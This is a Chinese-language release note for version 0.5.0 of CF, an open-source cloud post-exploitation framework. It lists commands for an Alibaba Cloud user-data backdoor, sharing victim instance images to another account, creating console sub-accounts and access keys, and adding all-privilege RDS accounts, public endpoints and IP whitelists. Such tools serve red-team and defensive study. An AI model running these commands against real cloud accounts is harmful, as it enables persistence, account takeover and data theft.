---
title: 0.5.0 版本更新描述
---

<center><h1>CF 云环境利用框架现已更新至 0.5.0 版本</h1></center>

CF 是一个云环境利用框架，主要拿来进行云访问凭证的后利用，助力云上攻防。

CF 于 2022 年 7 月 1 日发布，今天正好是该工具发布的一周年，现在 CF 已有近 2k Stars，今天 CF 更新到了 0.5.0 版本，这里介绍下这个版本所更新的内容。

CF 项目地址：[github.com/teamssix/cf](https://github.com/teamssix/cf)

CF 使用手册：[wiki.teamssix.com/cf](https://wiki.teamssix.com/cf)

## 新增功能

### 1. 新增阿里云用户数据后门功能

由于在实例启动时，会执行用户数据中的内容，因此通过往用户数据中写入文件，可以起到后门的作用。

现在使用以下命令，就可以修改实例中的用户数据，这样当实例重启时就会执行该命令了。

```bash
cf alibaba ecs exec --userDataBackdoor "whoami"
```
<img width="900" src="/img/1688136553.png">

### 2. 新增阿里云镜像共享功能

通过镜像共享功能，可以将当前实例的镜像共享给其他的阿里云账号，这样当其他的阿里云账号下使用这个共享镜像创建实例的时候，就能看到目标实例中的数据了。

使用以下命令进行创建共享镜像，-a 参数用来指定要共享给的阿里云账号。

```bash
cf alibaba ecs imageShare -a <account_id>
```

<img width="900" src="/img/1688136975.png">

使用以下命令，可以列出当前已共享的镜像。

```bash
cf alibaba ecs imageShare ls
```

<img width="900" src="/img/1688137015.png">

使用以下命令即可取消共享镜像。

```bash
cf alibaba ecs imageShare cancel
```

<img width="900" src="/img/1688137294.png">

### 3. 新增阿里云接管控制台时自动创建 AK 功能

在接管云平台时，如果加上 -a 参数，CF 除了会自动创建用于登录控制台的子账号外，还会自动创建这个子账号的访问凭证。

```bash
cf alibaba console -a
```

<img width="900" src="/img/1688137351.png">

### 4. 新增阿里云 RDS 列出详细信息功能

在列出数据库实例时加上 -a 命令，会列出数据库实例的详细信息。

```ba sh
cf alibaba rds ls -a
```

<img width="700" src="/img/1688137398.png">

### 5. 新增阿里云 RDS 添加账号功能

使用以下命令为 RDS 添加账号。

```
cf alibaba rds account
```

默认会创建 crossfire 用户，且赋予所有权限，也可以使用 -u 指定其他用户名。

加上 ls 查看已经创建的账号。

```
cf alibaba rds account ls
```

加上 del 删除已经创建的账号。

```
cf alibaba rds account del
```

<img width="800" src="/img/1688137422.png">

### 6. 新增阿里云 RDS 创建公网访问地址的功能

使用以下命令为 RDS 启用公开访问。

```
cf alibaba rds public
```

加上 ls 列出配置过的公开访问信息。

```
cf alibaba rds public ls
```

加上 cancel 取消公开访问。

```
cf alibaba rds public cancel
```

<img width="900" src="/img/1688137445.png">

### 7. 新增阿里云 RDS 添加白名单的功能

使用以下命令为数据库添加白名单，-w 参数指定 CIDR 地址或者单个 IP 地址。

```
cf alibaba rds whiteList -w <ip>
```

加上 ls 列出之前添加过的白名单信息。

```
cf alibaba rds whiteList ls
```

加上 del 删除之前添加过的白名单信息。

```
cf alibaba rds whiteList del
```

<img width="900" src="/img/1688137471.png">

### 8. 新增查询 AK 所属云厂商功能

使用以下命令即可轻松判断 AK 所属云厂商，目前该功能已支持腾讯云、阿里云、AWS、华为云、百度云、火山引擎、金山云、京东云、GCP、七牛云、UCloud 的 AK 识别。

```
cf config query -a <your_access_key_id>
```

<img width="900" src="/img/1688137494.png">

-a 参数用来指定 Access Key Id，该参数是必填的，当只填该参数时会仅通过正则判断所属云厂商。
如果加上了 -s 参数指定 Secret Access Key ，或者同时加上了 -t 参数指定 Session Token ，则除了会调用正则外，还会调用相关接口用来判断 AK 是否可用，从而能更准确的判断 AK 所属厂商。

### 9. 新增支持 brew 安装

对于 Mac、Linux 用户而言，现在可以直接使用 HomeBrew 来安装 CF 了，非常方便。

```
brew tap teamssix/tap
brew install teamssix/tap/cf
```

<img width="900" src="/img/1688144981.png">

## 功能优化

1. 优化配置功能，现在能自动识别配置是否处于可用状态
2. 优化实例公网 IP 展示，不存在时会展示为空
3. 优化 OSS 下载功能，现在默认会下载所有文件
4. 优化更新处理逻辑
5. 优化华为云 OBS 列出功能

## Bug 修复

1. 修复批量执行命令时，没有安装云助手导致批量执行中断的 Bug
2. 修复 OSS 下载文件无法自动创建目录的 Bug

## 贡献者

在本次更新中，收到来自 shadowabi、Kfzz1 两位师傅的 PR，感谢两位师傅。

其中，尤其感谢 shadowabi 师傅，本次更新中的用户数据后门、镜像共享、自动创建 AK 和 RDS 的相关利用等功能的核心代码均由 shadowabi 师傅提交。

以下是曾经为 CF 提交过 PR 的师傅们，感谢各位师傅。

<img width="900" src="/img/1688137526.png">


<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 7 月 1 日"
    }
  }
</script>
